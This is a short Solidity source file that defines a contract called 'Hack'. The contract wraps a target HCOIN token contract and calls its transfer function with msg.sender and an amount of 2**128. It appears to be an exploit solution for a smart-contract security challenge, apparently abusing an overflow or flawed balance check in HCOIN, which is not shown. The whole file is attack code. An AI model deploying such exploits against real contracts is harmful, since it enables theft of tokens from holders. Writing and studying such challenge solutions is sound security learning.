// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./HCOIN.sol";

contract Hack {
    HCOIN _hcoin;

    constructor(address payable _target) public  {
        _hcoin = HCOIN(_target);
    }

    function hack() public {
        _hcoin.transfer(address(msg.sender), 2**128);
    }
}